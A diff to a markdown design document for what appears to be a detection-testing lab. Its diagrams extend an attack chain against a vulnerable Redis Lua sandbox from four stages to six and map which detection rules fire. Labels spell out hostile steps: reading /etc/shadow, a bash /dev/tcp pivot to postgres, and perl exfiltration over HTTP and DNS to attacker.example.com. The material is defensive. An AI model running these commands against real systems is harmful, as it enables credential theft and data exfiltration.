@@ -85,8 +85,10 @@ flowchart LR
 
 ## 3 · The attack chain — one POST per stage, all to the eval endpoint
 
-Single attacker, four sequential HTTP POSTs into the SAME legitimate
+Single attacker, six sequential HTTP POSTs into the SAME legitimate
 endpoint. The variant is the Lua **payload**, not the entry vector.
+Stages 5 + 6 are opt-in (`./scripts/local-ci-chain.sh --extended`);
+stages 1-4 are the default basic chain.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -95,23 +97,30 @@ flowchart TB
   classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
-  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
 
-  atk(["<b>attacker</b><br/><i>4 × POST /api/cache/eval</i>"]):::warn
+  atk(["<b>attacker</b><br/><i>4-6 × POST /api/cache/eval</i>"]):::warn
 
   s1["<b>s1 · recon</b><br/><i>script: INCR counter</i><br/>blind by design"]:::cmp
   s2["<b>s2 · escape + shadow</b><br/><i>loadlib → io.popen('cat /etc/shadow')</i>"]:::warn
-  s3["<b>s3 · pivot</b><br/><i>io.popen('bash -c &quot;exec 3&lt;&gt;/dev/tcp/chain-postgres/5432&quot;')</i>"]:::warn
+  s3["<b>s3 · pivot</b><br/><i>io.popen('bash -c &quot;exec 3&lt;&gt;/dev/tcp/chain-postgres/5432&quot;')</i><br/>(SSL probe only)"]:::warn
   s4["<b>s4 · exfil</b><br/><i>io.popen('perl IO::Socket → attacker.example.com')</i>"]:::warn
+  s5["<b>s5 · real pg-wire</b><br/><i>perl: Startup + Query + parse DataRow</i><br/>(extracts ROW back)"]:::ext
+  s6["<b>s6 · DNS exfil</b><br/><i>perl: base32(ROW) → getent</i><br/>chunk.attacker.example.com per label"]:::ext
 
   fe["<b>chain-frontend</b><br/><i>RESP proxy to redis</i>"]:::live
   rd["<b>chain-redis</b><br/><i>vulnerable Lua sandbox</i>"]:::ref
+  pg["<b>chain-postgres</b><br/><i>AUTH_METHOD=trust</i>"]:::live
 
   atk --> s1 --> fe
   atk --> s2 --> fe
   atk --> s3 --> fe
   atk --> s4 --> fe
+  atk -. extended .-> s5 -.-> fe
+  atk -. extended .-> s6 -.-> fe
   fe ==>|EVAL| rd
+  rd ==>|pg-wire Startup+Query| pg
+  pg -. DataRow .-> rd
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -120,8 +129,8 @@ flowchart TB
 
 ## 4 · Where each detection fires (or doesn't)
 
-Same 4 stages, but the focus is now WHICH RULE on WHICH POD. Green = fires,
-red = silent.
+All 6 stages, but the focus is now WHICH RULE on WHICH POD. Green = fires,
+red = silent. Blue stages (s5, s6) are opt-in via `--extended`.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -130,25 +139,33 @@ flowchart LR
   classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
   classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
 
   subgraph Stages [" "]
     direction TB
     s1["<b>s1 recon</b>"]:::cmp
     s2["<b>s2 escape + shadow</b>"]:::warn
-    s3["<b>s3 pivot</b>"]:::warn
-    s4["<b>s4 exfil</b>"]:::warn
+    s3["<b>s3 pivot (SSL probe)</b>"]:::warn
+    s4["<b>s4 exfil (HTTP)</b>"]:::warn
+    s5["<b>s5 pg-wire + row</b>"]:::ext
+    s6["<b>s6 DNS exfil row</b>"]:::ext
   end
 
   subgraph Detections [" detections on chain-redis "]
     direction TB
-    r0001a(["<b>R0001 cat</b><br/>unexpected process"]):::ok
-    r0010(["<b>R0010 /etc/shadow</b><br/>sensitive file"]):::ok
-    r0001b(["<b>R0001 bash</b><br/>unexpected process"]):::ok
-    r0011a(["<b>R0011 → postgres</b><br/>unexpected egress"]):::warn
-    r0001c(["<b>R0001 perl</b><br/>unexpected process"]):::ok
-    r0005(["<b>R0005 attacker.example.com</b><br/>DNS anomaly"]):::warn
-    r0011b(["<b>R0011 external:80</b><br/>unexpected egress"]):::warn
+    r0001a(["<b>R0001 cat</b>"]):::ok
+    r0010(["<b>R0010 /etc/shadow</b>"]):::ok
+    r0001b(["<b>R0001 bash</b>"]):::ok
+    r0011a(["<b>R0011 → postgres</b>"]):::warn
+    r0001c(["<b>R0001 perl</b><br/>external</b>"]):::ok
+    r0005a(["<b>R0005 attacker.example.com</b>"]):::warn
+    r0011b(["<b>R0011 external:80</b>"]):::warn
+    r0001d(["<b>R0001 perl</b><br/>pg-wire</b>"]):::ok
+    r0011c(["<b>R0011 → postgres:5432</b>"]):::warn
+    r0001e(["<b>R0001 perl</b><br/>dns-exfil</b>"]):::ok
+    r0005b(["<b>R0005 *.attacker.example.com (×N)</b>"]):::warn
+    r0011d(["<b>R0011 → DNS resolver</b>"]):::warn
   end
 
   s2 ==>|fires| r0001a
@@ -156,8 +173,13 @@ flowchart LR
   s3 ==>|fires| r0001b
   s3 -.->|silent| r0011a
   s4 ==>|fires| r0001c
-  s4 -.->|silent| r0005
+  s4 -.->|silent| r0005a
   s4 -.->|silent| r0011b
+  s5 ==>|fires| r0001d
+  s5 -.->|silent| r0011c
+  s6 ==>|fires| r0001e
+  s6 -.->|silent| r0005b
+  s6 -.->|silent| r0011d
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
